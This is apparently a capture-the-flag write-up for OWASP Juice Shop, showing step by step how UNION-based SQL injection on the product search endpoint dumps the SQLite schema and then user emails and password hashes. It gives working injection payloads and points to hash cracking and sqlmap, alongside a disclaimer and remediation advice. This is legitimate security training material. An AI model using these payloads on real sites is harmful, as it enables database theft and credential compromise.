# Database Schema
*Exfiltrate the entire DB schema definition via SQL Injection.*
#### Category: Injection
#### Difficulty: ★★★
#### Walktrough: [Video](https://go.screenpal.com/watch/cOhj66ntX1b) - Duration 4:46 min

## Table of Contents:
- [Vulnerability Overview](#vulnerability-overview-sql-injection)
- [Risk and Impact](#risk-and-impact)
- [Reproduction Steps](#reproduction-steps)
- [Bonus Challenge: User Credentials](#bonus-challenge-user-credentials)
- [Remediation](#remediation)
- [Optional notes](#optional-notes)

> [!WARNING]  
> The content provided in this repository is for educational and ethical security testing purposes only. All demonstrations were performed in a controlled, local environment using the OWASP Juice Shop, a deliberately insecure web application. Unauthorized access to computing systems is illegal. The author is not responsible for any misuse of this information. Always obtain explicit permission before testing any system that you do not own.

# Vulnerability Overview: SQL Injection
This vulnerability occurs when an application fails to sanitize user input before including it in a database query. By using the `UNION` operator, an attacker can append a second, custom query to the original one and exfiltrate sensitive data.

In the Juice Shop the `/rest/products/search?q=` endpoint is vulnerable to UNION-based SQL Injection and, because the application is built on SQLite, attackers can target the internal `sqlite_master` table, which serves as the blueptint of the entire database structure.

## Risk and Impact
- **Full Data Leakage**: Attackers can identify every table in the database, including those not meant for public view.

- **Credential Theft**: Once the schema is known, attackers can further escalate and target columns like email and password to dump user credentials.

- **Targeted Escalation**: Knowing the schema allows an attacker to find administrative flags or hidden features, leading to full account takeovers.

## Reproduction Steps
### 1. Identify the Entry Point
Capture a search request in Burp Suite and send it to the **Repeater**:  
```
GET /rest/products/search?q=
```

### 2. Trigger an Error to Leak the Query
Input a malformed query, like `'!`, to force a syntax error:
```
GET /rest/products/search?q='!
```
And observe how the server returns a `500 Internal Server Error` leaking the database used, `SQLite`, and revealing the internal query structure:
```
SELECT * FROM Products WHERE ((name LIKE '%'!' OR description LIKE '%'!') AND deletedAt IS NULL) ORDER BY name
```

### 3. Research where the schema table is stored
Knowing that database used, navigate to the official website and find where the schema table is stored. For `SQLite` this table can have different names. In the Juice Shop case, it's called `sqlite_master`.

### 4. Determine the Column Count
The original query (the one fetching Products data) selects a specific number of columns. To use `UNION`, your injected query **must** match that count. *Fuzz* the columns manually using Burp Repeater.  

Start by selecting a single one from `sqlite_master`:
```
GET /rest/products/search?q=')) UNION SELECT 1 FROM sqlite_master--
```
If the server rreturns an error, the column count doesn't match. Incrementally add columns:
```
GET /rest/products/search?q=')) UNION SELECT 1,2 FROM sqlite_master--
```
Continue until eventually a success response is returned. In this case the count is 9:
```
GET /rest/products/search?q=')) UNION SELECT 1,2,3,4,5,6,7,8,9 FROM sqlite_master--
```

> [!TIP]  
> Replace the space between characters with a `+` or encode the entire payload in `URI` format or `base64` to ensure a correct parsing

You can *clean* the output to only display your injected data by nullifying the first part of the query, injecting an existing product or a non existent one:
```
GET /rest/products/search?q=apple'))+UNION+SELECT+1,2,3,4,5,6,7,8,9+FROM+sqlite_master--
```

### 5. Determine which Column can display text data
After confirming the original column count, test which one can display text data. Inject a `'test'` string and observe in the response if the string is displayed (positive match). If not, proceed with the next one.
```
GET /rest/products/search?q=apple'))+UNION+SELECT+'test',2,3,4,5,6,7,8,9+FROM+sqlite_master--
```

### 6. Extract the Schema
As last step, replace one of the placeholder with the `sql` column from the `sqlite_master` table.
The `sql` column is the one containing the `CREATE TABLE` statement, that  *is usually a copy of the original statement used to create the object*.

Final Payload:
```
apple'))+UNION+SELECT+sql,2,3,4,5,6,7,8,9+FROM+sqlite_master--
```
The response will now contain the complete database schema.


## Bonus Challenge: User Credentials
*Retrieve a list of all user credentials via SQL Injection.*
#### Category: Injection
#### Difficulty: ★★★★
#### Walktrough: Last 15 seconds of Database Schema Video

> [!NOTE]  
> Since this challenge belongs to the same category and it's one injection directly after exfiltrating the Schema, it felt like a natural follow-up in the Chain of Attack, and therefore I included it at the end of the video.

The extracted schema displays the table `Users`, which contains the columns named `email` and `password`.  
Change the payload to target that specific table:

```
apple'))+UNION+SELECT+email,password,3,4,5,6,7,8,9+FROM+Users--
```

Observe how the application now populates the Product `id` and `name` fields with the emails and hashed passwords of every user in the system. This demonstrates how a single vulnerability in a search bar can lead to a total compromise of user privacy.

From there escalate further by saving the results and attempt cracking the hashes using `john` or `hashcat`.

## Remediation
- **Parameterized Queries**: Use placeholders (like ?) so the database treats user input strictly as data, never as executable SQL code.

- **Input Validation**: Implement a deny-list for special characters or, an "allow-list" that only permits alphanumeric characters for search terms.

- **Generic Error Messages**: Configure the server to return a generic error message instead of leaking the entire SQL query string.

## Optional Notes
The entire process could be automate using `sqlmap`.


<--[Main Readme](/README.md)